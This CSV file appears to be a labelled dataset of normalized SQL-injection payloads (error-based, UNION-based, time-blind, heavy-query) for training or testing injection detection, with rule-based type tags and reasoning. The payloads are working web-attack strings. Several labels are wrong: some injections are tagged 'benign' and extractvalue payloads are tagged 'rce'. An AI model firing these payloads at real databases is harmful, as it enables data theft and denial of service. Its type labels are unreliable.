row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
2682,"-4811%' ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( '%' = '",1,,error_based,generic,0.95,convert ( int detected — error_based injection (priority 4) on generic,rule-based
2683,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'qipt' = 'qipt",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
2684,"1"" ) as wxea where 6394 = 6394 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1,,rce,generic,0.95,0x4b774c75 detected — rce injection (priority 1) on generic,rule-based
2685,"1"" ) ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""eoab"" like ""eoab",1,,error_based,generic,0.95,convert ( int detected — error_based injection (priority 4) on generic,rule-based
2686,"-9145%' ) ) ) or make_set ( 9017 = 9368,9368 ) and ( ( ( '%' = '",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
2687,"1' ) where 7646 = 7646 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
2688,"1%"" ) union all select null,null,null,null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2689,"-6389"" union all select 2355,2355,2355,2355,2355--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2690,"1"" ) ) as chal where 6661 = 6661",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2691,1' ) ) as iipj where 6560 = 6560,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2692,"1"" ) or sleep ( 5 ) and ( ""fiag"" like ""fiag",1,,time_blind,mysql,0.95,"sleep (, or sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
2693,1' or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and 'ejdk' like 'ejdk,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
2694,"-9941 union all select 1321,1321,1321,1321,1321,1321,1321#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2695,"1"" and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ""okpa"" = ""okpa",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
2696,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and '%' = '",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
2697,"-2896' ) ) as wisk where 1030 = 1030 union all select 1030,1030,1030,1030#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2698,-9363%' or ( 8459 = 8459 ) *4906 and '%' = ',1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2699,"1%' and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and '%' = '",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
